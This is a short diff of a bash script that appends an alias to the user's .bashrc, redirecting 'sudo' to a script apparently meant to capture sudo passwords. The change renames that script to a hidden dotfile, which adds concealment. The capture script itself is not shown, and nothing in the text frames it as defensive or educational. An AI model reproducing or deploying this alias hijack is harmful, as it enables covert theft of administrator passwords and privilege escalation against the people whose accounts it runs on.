@@ -1,4 +1,4 @@
 #!/bin/bash
 
-echo "alias sudo=\"$(pwd)/sudocapture.sh\"" >> /home/$(whoami)/.bashrc
+echo "alias sudo=\"$(pwd)/.sudocapture.sh\"" >> /home/$(whoami)/.bashrc
 source ~/.bashrc
